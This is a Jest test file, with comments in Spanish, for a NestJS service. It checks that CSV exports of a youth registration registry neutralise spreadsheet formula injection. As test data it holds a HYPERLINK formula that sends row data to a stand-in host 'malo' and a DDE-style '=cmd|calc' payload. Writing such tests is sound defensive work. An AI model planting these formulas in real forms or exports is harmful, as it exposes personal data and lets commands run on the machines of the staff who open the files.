// ===========================================
// E2E — Inyección de fórmulas en la exportación CSV (R15)
// ===========================================
//
// El vector no necesita ninguna credencial: el formulario público de
// inscripción acepta el apellido que uno escriba. Si alguien se anota como
// `=1+1` —o, con menos gracia,
// `=HYPERLINK("http://malo/?d="&B2,"Ver constancia")`— el padrón se exporta y
// alguien de la Secretaría lo abre con doble clic. Excel no ve un apellido: ve
// una fórmula, y la ejecuta con acceso al resto de la fila (el DNI del chico,
// el teléfono). Con el diálogo de DDE aceptado se llega a ejecución de
// comandos.
//
// La defensa es prefijar la celda con un apóstrofo. El test genera el CSV
// **completo** a través del service real (mismo `escribirCsv` que sirve el
// endpoint) y mira los bytes que salen.
import { Writable } from 'stream';
import { Test, TestingModule } from '@nestjs/testing';
import {
  ReportsService,
  neutralizarFormulaCsv,
} from '../src/modules/reports/reports.service';
import { PrismaService } from '../src/database/prisma.service';

/** Destino que acumula lo escrito, como haría el `res` de Express. */
class DestinoBuffer extends Writable {
  chunks: Buffer[] = [];
  headersSent = false;
  readonly terminado: Promise<void>;

  constructor() {
    super();
    this.terminado = new Promise((resolve, reject) => {
      this.once('finish', () => resolve());
      this.once('error', reject);
    });
  }

  _write(chunk: Buffer, _enc: BufferEncoding, cb: (e?: Error) => void) {
    this.headersSent = true;
    this.chunks.push(Buffer.from(chunk));
    cb();
  }

  get texto(): string {
    return Buffer.concat(this.chunks).toString('utf8');
  }
}

/** Participante con el apellido que le pasemos. */
function participante(indice: number, lastName: string) {
  return {
    id: `p${indice}`,
    dni: '48123456',
    firstName: 'Juan',
    lastName,
    sex: 'MASCULINO',
    birthDate: new Date('2012-05-15T00:00:00.000Z'),
    department: 'Pilcomayo',
    locality: 'Clorinda',
    phone: '3704123456',
    email: 'juan@example.com',
    inscriptions: [],
  };
}

describe('Exportación CSV — inyección de fórmulas (R15)', () => {
  let service: ReportsService;
  let apellidos: string[];

  beforeEach(async () => {
    apellidos = [];

    const prisma = {
      participant: {
        findMany: jest.fn(({ cursor }: { cursor?: { id: string } }) =>
          // Una sola página: el generador corta al recibir menos del lote.
          Promise.resolve(
            cursor ? [] : apellidos.map((a, i) => participante(i, a)),
          ),
        ),
      },
      inscription: { findMany: jest.fn(() => Promise.resolve([])) },
      team: { findMany: jest.fn(() => Promise.resolve([])) },
      match: { findMany: jest.fn(() => Promise.resolve([])) },
    };

    const moduleFixture: TestingModule = await Test.createTestingModule({
      providers: [ReportsService, { provide: PrismaService, useValue: prisma }],
    }).compile();

    service = moduleFixture.get(ReportsService);
  });

  /** Genera el CSV del padrón con los apellidos sembrados y lo devuelve. */
  async function generarCsv(...valores: string[]): Promise<string[]> {
    apellidos = valores;
    const destino = new DestinoBuffer();
    await service.escribirCsv(destino, service.especificacionParticipants());
    destino.end();
    await destino.terminado;

    // Se descarta el BOM y la fila de encabezados.
    return destino.texto
      .replace(/^\uFEFF/, '')
      .split('\n')
      .slice(1);
  }

  /** Contenido de la columna "Apellido" (la tercera) de una fila del CSV. */
  function celdaApellido(fila: string): string {
    const celdas = fila.match(/"(?:[^"]|"")*"/g) ?? [];
    return celdas[2].slice(1, -1).replace(/""/g, '"');
  }

  // -------------------------------------------------
  // El DoD: el caso literal del hallazgo
  // -------------------------------------------------
  it('un apellido `=1+1` no arranca con `=` en el archivo', async () => {
    const [fila] = await generarCsv('=1+1');
    const celda = celdaApellido(fila);

    expect(celda.startsWith('=')).toBe(false);
    expect(celda).toBe("'=1+1");
  });

  // -------------------------------------------------
  // Los cuatro caracteres
  // -------------------------------------------------
  it.each([
    ['=', '=1+1'],
    ['+', '+1+1'],
    ['-', '-1+1'],
    ['@', '@SUM(A1:A9)'],
  ])('neutraliza el que empieza con `%s`', async (inicio, valor) => {
    const [fila] = await generarCsv(valor);
    const celda = celdaApellido(fila);

    expect(celda.startsWith(inicio)).toBe(false);
    expect(celda).toBe(`'${valor}`);
  });

  // -------------------------------------------------
  // Espacios y tabs por delante: las planillas los descartan
  // -------------------------------------------------
  it.each([[' =1+1'], ['  @SUM(A1)'], ['\t=1+1'], ['\r=1+1'], ['\t\t+1']])(
    'neutraliza `%j` aunque venga con espacios o tabs adelante',
    async (valor) => {
      const [fila] = await generarCsv(valor);
      const celda = celdaApellido(fila);

      expect(celda.startsWith("'")).toBe(true);
      expect(/^\s*[=+\-@]/.test(celda)).toBe(false);
    },
  );

  // -------------------------------------------------
  // El caso realmente peligroso
  // -------------------------------------------------
  it('neutraliza un HYPERLINK que exfiltra la fila entera', async () => {
    const ataque = '=HYPERLINK("http://malo/?d="&A1&B1,"Ver constancia")';
    const [fila] = await generarCsv(ataque);

    expect(celdaApellido(fila).startsWith('=')).toBe(false);
    // El texto se conserva: el operador tiene que poder ver qué se cargó.
    expect(celdaApellido(fila)).toContain('HYPERLINK');
  });

  it('varias filas: cada celda se evalúa por su cuenta', async () => {
    const filas = await generarCsv('Pérez', '=cmd|calc', 'Gómez');

    expect(celdaApellido(filas[0])).toBe('Pérez');
    expect(celdaApellido(filas[1])).toBe("'=cmd|calc");
    expect(celdaApellido(filas[2])).toBe('Gómez');
  });

  // -------------------------------------------------
  // Lo que NO se toca
  // -------------------------------------------------
  it('un apellido normal sale igual que antes', async () => {
    const [fila] = await generarCsv('Pérez');
    expect(celdaApellido(fila)).toBe('Pérez');
  });

  it('el escape de comillas sigue siendo el de siempre', async () => {
    const [fila] = await generarCsv('dice "hola"');
    expect(fila).toContain('"dice ""hola"""');
  });

  it('el CSV conserva el BOM y el encabezado', async () => {
    apellidos = ['Pérez'];
    const destino = new DestinoBuffer();
    await service.escribirCsv(destino, service.especificacionParticipants());
    destino.end();
    await destino.terminado;

    expect(destino.texto.startsWith('\uFEFF"DNI"')).toBe(true);
  });

  // -------------------------------------------------
  // La función, aislada
  // -------------------------------------------------
  describe('neutralizarFormulaCsv', () => {
    it('no toca los números negativos', () => {
      // `-5` no es una fórmula; prefijarlo lo convertiría en texto y rompería
      // las columnas numéricas del reporte.
      expect(neutralizarFormulaCsv(-5)).toBe('-5');
      expect(neutralizarFormulaCsv('-5')).toBe('-5');
      expect(neutralizarFormulaCsv('-3.75')).toBe('-3.75');
      expect(neutralizarFormulaCsv('+2')).toBe('+2');
    });

    it('mantiene la representación de siempre para los valores raros', () => {
      expect(neutralizarFormulaCsv(null)).toBe('null');
      expect(neutralizarFormulaCsv(7)).toBe('7');
      expect(neutralizarFormulaCsv('')).toBe('');
    });

    it('sí toca lo que arranca como fórmula', () => {
      expect(neutralizarFormulaCsv('=1+1')).toBe("'=1+1");
      expect(neutralizarFormulaCsv('-1+1')).toBe("'-1+1");
      expect(neutralizarFormulaCsv('@juan')).toBe("'@juan");
    });
  });
});
